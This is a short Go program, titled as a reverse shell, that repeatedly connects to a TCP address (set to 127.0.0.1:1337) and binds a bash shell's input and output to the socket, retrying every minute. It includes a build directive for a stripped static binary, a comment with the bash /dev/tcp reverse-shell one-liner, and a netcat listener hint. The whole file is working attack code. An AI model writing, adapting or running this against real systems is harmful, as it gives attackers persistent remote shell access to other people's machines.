//go:generate sh -c "CGO_ENABLED=0 go build -installsuffix netgo -tags netgo -ldflags \"-s -w -extldflags '-static'\" -o $DOLLAR(basename ${GOFILE} .go)`go env GOEXE` ${GOFILE}"
//go:build !windows
// +build !windows

// Reverse Shell in Go
// http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
// Test with nc -lvvp 1337
package main

import (
	"net"
	"os/exec"
	"time"
)

func main() {
	reverse("127.0.0.1:1337")
}

// bash -i >& /dev/tcp/localhost/1337 0>&1
func reverse(host string) {
	for {
		socket, err := net.Dial("tcp", host)
		if nil != err {
			if nil != socket {
				socket.Close()
			}
			time.Sleep(time.Minute)
			continue
		}

		cmd := exec.Command("/usr/bin/env", "bash")
		cmd.Stdin, cmd.Stdout, cmd.Stderr = socket, socket, socket
		cmd.Run()
		socket.Close()
	}
}
